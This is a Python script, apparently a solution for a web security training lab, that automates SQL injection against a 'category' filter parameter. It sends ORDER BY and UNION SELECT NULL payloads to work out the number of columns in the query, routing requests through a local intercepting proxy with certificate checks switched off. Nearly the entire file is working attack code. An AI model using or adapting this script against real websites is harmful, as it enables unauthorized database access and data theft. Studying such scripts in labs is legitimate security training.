import requests
import urllib3
import sys
proxies = {'http':'http://127.0.0.1:8082','https':'http://127.0.0.1:8082'}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def unionattack(fullpath):
    for i in range (1,10):
        payload = "' ORDER BY %s--"%i
        r = requests.get(fullpath + payload, verify=False, proxies=proxies)
        if "Internal Server Error" in r.text:
           print("[+] No of columns is",i-1)
           break


def unionattack2(fullpath):
    load = "' UNION SELECT "
    for i in range(1,10):
        if (i == 1):
            fullpayload = load + "NULL"
        else:
            fullpayload = fullpayload +", "+"NULL"

        full = fullpath + fullpayload + "--"
        r = requests.get(full, verify=False, proxies=proxies)
        if r.status_code == 200:
            print("[+] No of columns is",i)
            print(full)
            break



if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()


    except IndexError:
        print("[+] Usage %s <url> <payload>" %sys.argv[0])
        print('[+] Example %s "https://example.com" "1=1--"' %sys.argv[0])
        sys.exit(1)
    path = "/filter?category=Gifts"
    fullpath = url + path
    unionattack(fullpath)
    unionattack2(fullpath)
